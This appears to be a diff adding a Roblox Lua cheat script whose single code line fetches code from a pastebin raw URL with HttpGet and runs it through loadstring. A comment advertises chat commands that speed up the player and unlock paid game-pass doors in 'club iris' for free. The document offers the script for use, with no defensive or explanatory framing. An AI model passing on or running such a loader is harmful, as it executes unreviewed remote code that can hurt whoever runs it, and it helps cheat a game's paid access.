@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/L1JvBrV7'),true))()
+
+--!speed or  /e !speed and !unlock or /e !unlock ( open all the game pass doors from club iris FOR FREE )
